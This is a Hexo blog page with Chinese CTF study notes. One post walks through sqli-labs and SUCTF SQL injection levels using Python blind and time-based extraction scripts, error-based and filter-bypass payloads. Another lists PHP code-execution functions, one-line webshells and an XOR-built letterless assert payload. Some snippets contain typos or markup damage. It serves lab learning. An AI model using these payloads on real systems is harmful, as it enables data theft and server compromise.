<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">吾将上下而求索</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-sql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/11/sql/" class="article-date">
  <time class="dt-published" datetime="2021-07-11T13:53:56.000Z" itemprop="datePublished">2021-07-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/11/sql/">sql</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>#基础部分的题</p>
<p>#num_1~4<br>#均为闭合方式不同<br>#Num_1<br>select * from users where id = ‘ ‘<br>#Num_2<br>select * from users where id =<br>#Num_3<br>select * from users where id =(‘ ‘)<br>#Num_4<br>select * form users where id =(“ “)</p>
<hr>
<p>#Num_5,6<br>##类似于盲注<br>##写了个脚本,爆库<br>    url = ‘<a target="_blank" rel="noopener" href="http://www.sqlzhuru.com/Less-5/&#39;">http://www.sqlzhuru.com/Less-5/&#39;</a><br>    table=””<br>    for j in range(1,10):<br>        for i in range(48,122):<br>            q =”?id=1’ and ascii(substr(database(),{},1))={}%23”.format(j,i)<br>            r = requests.get(url=url+q)<br>            if “You are in………..” in r.text:<br>                table = table + chr(i)</p>
<pre><code>print(table)
</code></pre>
<p>##爆表<br>def get_table():<br>    table = “”<br>    for k in range(0,4):<br>        for i in range(1,10):<br>            for j in range(48,122):<br>                q = “?id=1’ and (select ascii(substr((select table_name from information_schema.tables where table_schema = ‘security’ limit {},1),{},1))={})%23”.format(k,i,j)<br>                r = requests.get(url=url+q)<br>                if “You are in………..” in r.text:<br>                    table = table + chr(j)</p>
<pre><code>return table
</code></pre>
<p>##爆字段(只爆了users)<br>    def get_column():<br>        column = “”<br>        for k in range(0,4):<br>            for i in range(1,10):<br>                for j in range(48,122):<br>                    q = “?id=1’ and (select ascii(substr((select column_name from information_schema.columns where table_name = ‘users’ limit {},1),{},1))={})%23”.format(k, i, j)<br>                    r = requests.get(url=url+q)<br>                    if “You are in………..” in r.text:<br>                        column = column + chr(j)</p>
<pre><code>    return column
</code></pre>
<p>#Num_7绕过闭合方式+盲注即可,但是本关卡宗旨在于利用文件写入然后利用webshell</p>
<p>#Num_8同Num5,盲注,但是报错不能用,可以用sleep或者布尔</p>
<p>#Num_9<br>##与8关和5关在于,报错和回显都没了,只能用延时注入<br>##延时脚本<br>##爆库<br>    def get_database_sleep():<br>        database = “”<br>        for i in range(1, 10):<br>            for j in range(48, 122):<br>                q = “?id=1’ and if(ascii(mid(database(),{},1))={},sleep(3),1)–+”.format(i, j)<br>                r = requests.get(url=url + q)<br>                if r.elapsed.total_seconds()&gt;1:<br>                    database = database + chr(j)<br>        return database<br>##爆表<br>    def get_table_sleep():<br>        table = “”<br>        for k in range(0,4):<br>            for i in range(1,10):<br>                for j in range(48,122):<br>                    q = “?id=1’ and if(ascii(mid((select table_name from information_schema.tables where table_schema=’security’ limit {},1),{},1))={},sleep(2),1)%23”.format(k,i,j)<br>                    r = requests.get(url=url+q)<br>                    if r.elapsed.total_seconds()&gt;1:<br>                        table = table + chr(j)<br>                        print(table)<br>        return table<br>##爆列<br>    def get_table_sleep():<br>        column = “”<br>        for k in range(0,4):<br>            for i in range(1,10):<br>                for j in range(48,122):<br>                    q = “?id=1’ and if(ascii(mid((select column_name from information_schema.columns where table_name=’users’ limit {},1),{},1))={},sleep(2),1)%23”.format(k,i,j)<br>                    r = requests.get(url=url+q)<br>                    if r.elapsed.total_seconds()&gt;1:<br>                        column = column + chr(j)<br>                        print(column)<br>        return column<br>#Num_10同9,闭合方式由<br>select * from users where id = ‘ ‘变成id = “ “</p>
<p>#Num_11<br>##同1~5,只不过由GET转为POST</p>
<p>#Num12同11<br>##闭合方式由<br>    where username = ‘ ‘变成 username = (“ “)</p>
<p>#Num_13<br>##同Num_5,无回显,可用报错,或者延时<br>##爆库<br>    extractvalue(1,concat(0x7e,(select database()),0x7e))%23<br>##爆表<br>    extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))%23<br>##爆字段<br>    extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’),0x7e))%23<br>#Num_14<br>##同上,闭合方式更换了<br>    username = ‘ ‘变成 username = “ “</p>
<p>#Num_15<br>##同9,报错信息和回显均无,利用延时即可,举个例子<br>    uname=admin&amp;passwd=admin’  and if(substr(database(),1,1)=’s’,sleep(2),1)%23&amp;submit=Submit</p>
<p>#Num_16<br>##同上,闭合方式由<br>    username = ‘’更换为username = (“ “)</p>
<p>#Num_17<br>##update型,没办法用普通的注入,只能报错,做法同13<br>##爆库<br>    admin’ or (extractvalue(1,concat(0x7e,(select database()  ),0x7e)    ))%23<br>##后面类似</p>
<p>#Num_18<br>##看到回显位是Ua字段,肯定得抓包从UA字段下手<br>##insert型报错注入<br>     ‘ and (extractvalue(1,concat(0x7e,(select database()  ),0x7e)    )) and ‘<br>##注意闭合两边,不大理解的就是  在最后那为啥得加个and,不加and就不行</p>
<p>#Num_19<br>##同Num_18,注入字段从Ua换成了  referer</p>
<p>#Num_20<br>##同Num_18,注入字段从Ua换成了 Cookie,只不过闭合方式换了一下<br>##payload,爆库,后面类似:<br>    admin’ and (extractvalue(1,concat(0x7e,(select database()  ),0x7e)    ))%23</p>
<p>#Num_21<br>##同上,  只不过加了个base64编码而已,并且闭合方式变了一下<br>##爆库,后面差不多<br>    YWRtaW4nKSAgYW5kIChleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkgICksMHg3ZSkgICAgKSkj</p>
<p>#中级题</p>
<p>#Num_23<br>##瞅了半天,啥也没提示,最后无奈看了源码,发现过滤了注释符。。。<br>##直接绕过,然后跟第一题就没差别了<br>##爆库，后面就不写了,没差别<br>    ?id=1’ and 1=0 union select 1,database(),3 and ‘</p>
<p>#Num_24二次注入(不是特别理解)</p>
<p>#Num_25<br>##看页面提示, and和or给吃了,输出一下$sql(查询代码)<br>    1’ and %23<br>    SELECT * FROM users WHERE id=’1’ #’ LIMIT 0,1<br>##发现果然没了<br>##多种思路绕过,双写,异或,大小写变形,利用&amp;&amp;和||符号也可,payload:<br>    1’ aandnd 1=2%23<br>    1’ ^ 1%23<br>##建议双写,异或还得配合布尔,更麻烦,后边就不说了,碰到or 或者and的双写下即可</p>
<p>#Num_25_a<br>##同上,完全没差别</p>
<p>#Num_26<br>##看提示,空格给吞了,官方给的wp是说Windows不顶用,得换linux,咕了这题</p>
<p>#Num_27<br>##union 和 select 全没了<br>##瞧瞧过滤函数<br>    function blacklist($id)<br>    {<br>    $id= preg_replace(‘/[/*]/‘,””, $id);        //strip out /*<br>    $id= preg_replace(‘/[–]/‘,””, $id);        //Strip out –.<br>    $id= preg_replace(‘/[#]/‘,””, $id);            //Strip out #.<br>    $id= preg_replace(‘/[ +]/‘,””, $id);        //Strip out spaces.<br>    $id= preg_replace(‘/select/m’,””, $id);        //Strip out spaces.<br>    $id= preg_replace(‘/[ +]/‘,””, $id);        //Strip out spaces.<br>    $id= preg_replace(‘/union/s’,””, $id);        //Strip out union<br>    $id= preg_replace(‘/select/s’,””, $id);        //Strip out select<br>    $id= preg_replace(‘/UNION/s’,””, $id);        //Strip out UNION<br>    $id= preg_replace(‘/SELECT/s’,””, $id);        //Strip out SELECT<br>    $id= preg_replace(‘/Union/s’,””, $id);        //Strip out Union<br>    $id= preg_replace(‘/Select/s’,””, $id);        //Strip out select<br>    return $id;<br>    }<br>##就假设自己绕过了空格,注释,or,and<br>##这题跟前一题差在union,select<br>##思路一:双写绕过</p>
<p>#Num_27a<br>##同上,所有的a只是把报错信息关了而已,不用报错注入即可</p>
<p>#Num_28<br>##多试几次,只是过滤了union 和select一起用的时候,单用select还是可以的<br>##突破口:布尔即可</p>
<p>###SUCTF 2019 easy sql<br>    &lt;?php<br>        session_start();</p>
<pre><code>    include_once &quot;config.php&quot;;
    
    $post = array();
    $get = array();
    global $MysqlLink;
    
    //GetPara();
    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);
    if(!$MysqlLink)&#123;
        die(&quot;Mysql Connect Error!&quot;);
    &#125;
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB)&#123;
        die(&quot;Choose Database Error!&quot;);
    &#125;
    
    foreach ($_POST as $k=&gt;$v)&#123;
        if(!empty($v)&amp;&amp;is_string($v))&#123;
            $post[$k] = trim(addslashes($v));
        &#125;
    &#125;
    foreach ($_GET as $k=&gt;$v)&#123;
        if(!empty($v)&amp;&amp;is_string($v))&#123;
            $get[$k] = trim(addslashes($v));
        &#125;
    &#125;
    //die();
    ?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/a&gt;
&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php
    
    if(isset($post[&#39;query&#39;]))&#123;
        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;
        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#39;query&#39;]));
        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#39;query&#39;]))&#123;
            //echo $post[&#39;query&#39;];
            die(&quot;Nonono.&quot;);
        &#125;
        if(strlen($post[&#39;query&#39;])&gt;40)&#123;
            die(&quot;Too long.&quot;);
        &#125;
        $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;　　　　 //sql执行语句
        mysqli_multi_query($MysqlLink,$sql);
        do&#123;
            if($res = mysqli_store_result($MysqlLink))&#123;
                while($row = mysqli_fetch_row($res))&#123;
                    print_r($row);
                &#125;
            &#125;
        &#125;while(@mysqli_next_result($MysqlLink));
        
    &#125;
    
?&gt;
</code></pre>
<p>###源码是网上给找的(做完题后找)<br>###一开始手工注入一下,发现有过滤东西,or给过滤了,不知道还过滤了啥,先fuzz一套,看看过滤了啥,爆破一下,发现正常手工能用的函数都给ban了,没招,只能找资料了(学习一些新姿势除了堆叠)<br>###sql_mode规则的设置<br>    当 sql_mode 设置了  PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>    当 sql_mode 没有设置  PIPES_AS_CONCAT 时 (默认没有设置)，|| 就是逻辑或，相当于OR函数<br>###堆叠注入下,利用;可执行多语句,设置sql_ mode=PIPES_AS_CONCAT,使得||符号作为连接符,同时执行,这样再导入1;sql_mode=PIPES_AS_CONCAT,使得查询语句变为<br>    select 1;ssql_mode=PIPES_AS_CONCAT || flag from flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/11/sql/" data-id="ckqz9dyaq0000koc69zsievy3" data-title="sql" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/11/RCE/" class="article-date">
  <time class="dt-published" datetime="2021-07-11T13:37:02.000Z" itemprop="datePublished">2021-07-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/11/RCE/">RCE</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>#第一部分<br>#代码执行函数</p>
<p>##eval   (补充,这玩意到底是不是个函数???后面找了很多博客都说不是)<br>##最常见的东西,最常见的代码，把字符串 code 作为PHP代码执行<br>    <?php
        eval(@$_GET[1]);
    ?></p>
<p>##assert<br>##参数是表达式或函数,不能传字符串,在php5中可以作为动态函数调用,php7就不行,用法同上<br>    <?php
        assert(@$_GET[1]);
    ?></p>
<p>##preg_replace  在/e模式下,若匹配成功第二个参数会作为代码被执行,不过/e模式5.6后没了,条件苛刻,看看就好<br>##preg_replace 就是用于正则匹配并替换的<br>    $a = “/123/e”;<br>    $b = @$_GET[1];<br>    $c = “1231”;<br>    preg_replace($a,$b,$c);</p>
<p>##create_function() PHP7.2.0已经启用,在8已经被删除<br>##可以创建一个匿名函数,不好解释,直接看用法<br>    不太顶用,我跑不出来…<br>    <?php
    //02-8.php?id=2;}phpinfo();/*
    $id=$_GET['id'];
    $str2='echo  '.$a.'test'.$id.";";
    echo $str2;
    echo "<br/>";
    echo "==============================";
    echo "<br/>";
    $f1 = create_function('$a',$str2);
    echo "<br/>";
    echo "==============================";
    ?></p>
<p>##array_map<br>##可为传入数组的第二个参数的数组中的第一个元素做出函数执行,看用法<br>    $a = @$_GET[1];<br>    $b = @$_GET[2];<br>    array_map($a,$b);<br>##?1=assert&amp;2[]=phpinfo();</p>
<hr>
<p>##call_user_func<br>##第一个参数做主函数,第二个参数为函数的参数,用法如下<br>    $a = @$_GET[1];<br>    $b = @$_GET[2];<br>    call_user_func($a,$b);<br>##?1=assert&amp;2=phpinfo();</p>
<hr>
<h2 id="call-user-func-array-同array-map"><a href="#call-user-func-array-同array-map" class="headerlink" title="##call_ user_ func_ array()同array_map"></a>##call_ user_ func_ array()同array_map</h2><p>##array_filter()<br>##同上只不过参数位置不同<br>    $a = @$_GET[1];<br>    $b = @$_GET[2];<br>    array_filter($a,$b);<br>##?1=phpinfo()&amp;2=assert</p>
<hr>
<hr>
<hr>
<hr>
<p>#绕过技巧</p>
<p>#(1)字符串拼接   要求PHP版本&gt;=7</p>
<p><img src="https://img-blog.csdnimg.cn/20210103225920322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70"></p>
<h2 id="在不作声明的情况下-php会将原括号内的数据当成字符串处理-也就是说-不一定需要引号来表示字符串"><a href="#在不作声明的情况下-php会将原括号内的数据当成字符串处理-也就是说-不一定需要引号来表示字符串" class="headerlink" title="#在不作声明的情况下,php会将原括号内的数据当成字符串处理,也就是说,不一定需要引号来表示字符串"></a>#在不作声明的情况下,php会将原括号内的数据当成字符串处理,也就是说,不一定需要引号来表示字符串</h2><p>#(2)字符串转义绕过(太难了)</p>
<p>#(3)多次传参,过滤了引号,利用传两个参达到RCE<br>##比如<br>    <?php
        $cmd = @$_POST[1];
        eval($cmd);
    ?>    </p>
<p>传参1=$_GET<a href="$_GET%5B3%5D">2</a>;</p>
<p>?2=assert&amp;3=phpinfo()</p>
<p>#可以用$符号的无字母数字RCE  ,或称为异或绕过($不能用后面说)</p>
<p>#第二部分<br>#绕过技巧知识前提<br>#基本思路<br>    1.bypass open basedir<br>    2.bypass disable functions<br>    3.execute readflag<br>#(1)两个字符串异或之后还是一个字符串,利用符号的异或产生每个字符,达到RCE的效果<br>    字符：?         ASCII码：63           二进制：  00‭11 1111‬<br>    字符：~         ASCII码：126          二进制：  0111 1110‬<br>    异或规则：<br>    1   XOR   0   =   1<br>    0   XOR   1   =   1<br>    0   XOR   0   =   0<br>    1   XOR   1   =   0<br>    上述两个字符异或得到 二进制：  0100 0001<br>    该二进制的十进制也就是：65<br>    对应的ASCII码是：A<br>##目的就是通过一些无法显示的字符的ascii,达到绕过的目的,这里给个我写的脚本<br>    list1 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21,<br>            22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 40, 41, 42, 43,<br>            44, 45, 46, 47, 58,<br>            59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127]<br>    list2 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21,<br>            22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 40, 41, 42, 43,<br>            44, 45, 46, 47, 58,<br>            59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127]<br>    payload = “phpinfo”<br>    k=0<br>    for i in payload:<br>        for j in list1:<br>            for k in list2:<br>                if chr(j ^ k) == i:<br>                    print(i)<br>                    print(j)<br>                    print(k)<br>                    print(“—-“)<br>                    break<br>            else:<br>                continue<br>            break<br>##list是非字母数字所对应的ascii码</p>
<p>##要利用,还得知道两个$,可变变量,也就是说,名称也是变量,比如说<br>    $a = ‘hello’;<br>    $$a = ‘world’;<br>##$a的值是hello,那么$$a,意思就是$hello<br>    echo $hello<br>##就得到world</p>
<p>##一次类推,高潮部分来了,php可以直接转义hex(16进制,我上边的脚本是生成10进制,注意转换),我直接生成一个assert<br>    $<em>=(‘%01’^’%60’).(‘%08’^’%7b’).(‘%08’^’%7b’).(‘%05’^’%60’).(‘%09’^’%7b’).(‘%08’^’%7c’);<br>    //$</em>=’assert’;<br>    $<strong>=’_’.(‘%07’^’%40’).(‘%05’^’%40’).(‘%09’^’%5d’);<br>    //$</strong>=’<em>GET’;<br>    $</em><strong>=$$</strong>;<br>    //$<em>_<em>=’$<em>GET’;<br>    $</em>($</em>_</em>[<em>]);<br>    //assert($<em>GET[</em>]);<br>##这里我就不解释了,直接可以看$$我上边说的,自己体会<br>##这样生成的全部代码传给题目的shell即可(万金油)<br>    payload:$</em>=(‘%01’^’%60’).(‘%08’^’%7b’).(‘%08’^’%7b’).(‘%05’^’%60’).(‘%09’^’%7b’).(‘%08’^’%7c’);$<strong>=’<em>‘.(‘%07’^’%40’).(‘%05’^’%40’).(‘%09’^’%5d’);$</em></strong>=$$<strong>;$<em>($</em></strong>[<em>]);&amp;</em>=phpinfo();</p>
<p>#(2)php7前不允许使用($a)()来执行函数,php7之后可以,比如后边我会提到system(‘whoami’); 就得用到($a)()来执行<br>#(3)shell下可以利用.来执行任意脚本<br>#(4)Linux文件名支持用glob通配符代替<br>#(5)LD_preload的使用</p>
<hr>
<p>#url编码取反绕过  对php版本不限制</p>
<p><img src="https://img-blog.csdnimg.cn/2021011322442091.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70"></p>
<pre><code>%8F%97%8F%96%91%99%90
//phpinfo
</code></pre>
<hr>
<hr>
<p>#接下来看道例题<br>#简单点的就是<br>    &lt;?php<br>    if(!preg_match(‘/[a-z0-9]/is’,$_GET[‘shell’])) {<br>      eval($_GET[‘shell’]);<br>    }<br>##做法就是上边异或或者url编码取反均可</p>
<hr>
<p>#拔高题,如果限制了长度怎么办?<br>#2019极客大挑战  RCE ME<br>    &lt;?php<br>    error_reporting(0);<br>    if(isset($_GET[‘code’])){<br>                $code=$_GET[‘code’];<br>                        if(strlen($code)&gt;40){<br>                                            die(“This is too Long.”);<br>                                                    }<br>                        if(preg_match(“/[A-Za-z0-9]+/“,$code)){<br>                                            die(“NO.”);<br>                                                    }<br>                        @eval($code);<br>    }<br>    else{<br>                highlight_file(<strong>FILE</strong>);<br>    }</p>
<pre><code>// ?&gt;
</code></pre>
<p>##考点就是无字母数字rce,大致流程,写个shell,短暂传马,然后ld_preload绕disable_function</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/11/RCE/" data-id="ckqz8sjy70000ckc622la4lp1" data-title="RCE" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/11/hello-world/" class="article-date">
  <time class="dt-published" datetime="2021-07-11T13:10:51.529Z" itemprop="datePublished">2021-07-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/11/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/11/hello-world/" data-id="ckqz8n9wx000078c6cjkv70ej" data-title="Hello World" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/07/11/sql/">sql</a>
          </li>
        
          <li>
            <a href="/2021/07/11/RCE/">RCE</a>
          </li>
        
          <li>
            <a href="/2021/07/11/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; Lai yl<br>
      Powered by <a href="https://echo666best.github.io" target="_blank">Ech0</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>
